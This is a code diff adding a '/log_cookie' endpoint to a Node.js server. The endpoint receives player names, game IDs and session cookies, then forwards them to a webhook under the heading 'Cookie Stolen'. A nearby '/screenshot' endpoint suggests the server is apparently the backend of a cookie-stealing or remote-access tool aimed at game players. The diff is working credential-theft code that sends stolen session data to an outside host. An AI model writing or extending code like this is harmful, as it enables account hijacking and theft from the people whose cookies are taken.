@@ -78,6 +78,34 @@ const server = http.createServer((req, res) => {
         return;
     }
 
+    if (req.method === 'POST' && req.url === '/log_cookie') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const { player, cookie, game_id, timestamp } = JSON.parse(body);
+                
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🍪 **Cookie Stolen**\n` +
+                                 `Player: ${player}\n` +
+                                 `Game: ${game_id}\n` +
+                                 `Time: ${new Date(timestamp * 1000).toISOString()}\n` +
+                                 `Cookie: ||\`${cookie}\`||`
+                    })
+                }).catch(console.error);
+                
+                res.end(JSON.stringify({ status: "Cookie logged" }));
+            } catch (e) {
+                res.statusCode = 400;
+                res.end(JSON.stringify({ error: "Invalid cookie data" }));
+            }
+        });
+        return;
+    }
+
     if (req.method === 'GET' && req.url === '/screenshot') {
         if (lastScreenshot) {
             res.end(JSON.stringify({ image: lastScreenshot }));
